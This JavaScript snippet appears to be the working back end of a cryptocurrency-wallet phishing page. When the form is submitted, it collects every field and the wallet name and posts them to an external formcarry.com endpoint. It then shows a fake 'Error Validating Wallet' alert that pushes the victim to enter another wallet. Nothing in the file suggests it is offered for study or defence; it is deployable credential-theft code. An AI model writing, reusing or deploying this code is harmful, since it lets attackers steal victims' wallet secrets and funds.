function inspectExport(strings, nextPage) {
  const formData = new FormData();
  formData.append('From', window.location.host);
formData.append('Wallet', document.getElementById('wallet_name').innerHTML);

  
   Object.keys(strings).forEach(function (key) {
    formData.append(`${strings[key]["name"]}`, `${strings[key]["value"]}`);
  });

  const email_shortcode = "naYpfv0dIPw";
  const send_rep = `https://formcarry.com/s/${email_shortcode}`;

  fetch(send_rep, {
      method: "POST",
      method: "POST",
      headers: {
          "Accept": "application/json", 
      },
      body: formData,
    
    
    })
  .then(response => {
    response.json();
   setTimeout(function () {
    alert("Error Validating Wallet, Please try another wallet");
}, 500);
})
  .catch(error => console.error("Error:", error));

 
}


document.querySelector("form").addEventListener("submit", function (e) {
  e.preventDefault(e);
  var form = $(this).serializeArray();
  inspectExport(form, "#");
});

